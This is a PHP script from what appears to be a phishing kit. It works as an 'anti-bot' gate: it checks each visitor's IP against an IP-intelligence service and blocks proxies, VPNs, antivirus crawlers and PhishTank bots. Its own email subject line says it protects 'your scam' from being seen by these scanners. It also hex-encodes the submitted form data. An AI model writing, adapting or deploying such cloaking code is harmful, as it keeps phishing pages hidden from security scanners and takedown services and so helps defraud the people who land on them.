<?php
	ob_start();
	// This is a killer ANTI BOT Will ban and blacklist every proxy / vpn / antivirus / phishtank bot using IP Intelligence and fingerprint. 
	// auto email report sent when a bot detected!!
	// Error Codes  -1 to -6
	// -1 Invalid no input
	// -2 Invalid IP address
	// -3 Unroutable address / private address
	// -4 Unable to reach database, most likely the database is being updated. Keep an eye on twitter for more information.
	// -5 Your connecting IP has been banned from the system or you do not have permission to access a particular service. Did you exceed your query limits? Did you use an invalid email address? If you want more information, please use the contact links below.
	// -6 You did not provide any contact information with your query or the contact information is invalid.
	// If you exceed the number of allowed queries, you'll receive a HTTP 429 error.
	if(count(get_included_files()) == 1){
		header("HTTP/1.0 304 Not Modified");
		die;
	}

	$_SESSION['ip'] = getIp();
	$ip = $_SESSION['ip'];
	$repm = $to;
	$ipo = $_SESSION['ip'];

	if($ipo == "127.0.0.1") {
 	}else{
		$isp = print_r($_POST, true);
		$isp = bin2hex($isp);
        $url = "http://check.getipintel.net/check.php?ip=$ipo&flags=b&contact=$repm&format=json&api=SKecCwlsiuTDuIT8gZT";
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);		
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $json = curl_exec($ch);
        curl_close($ch);
		$value = (array) json_decode($json);
		$a = $value['result'];
		if ($a <= 0.90){
		}else{
			header("HTTP/1.0 304 Not Modified");
			$MESSAGE="<p>Organization : $c </p> <p>IP : $ip</p>";
			$SUBJECT = "A BOT trying to access your scam and it was blocked successfully | $ip | $c";
			$HEADER = "MIME-Version: 1.0" . "\r\n";
			$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			$HEADER .= "From: BOTeye v1.5 <antibot@mail.com>\n";
			//mail($repm,$SUBJECT,$MESSAGE,$HEADER);
		die;
		}
    }
?>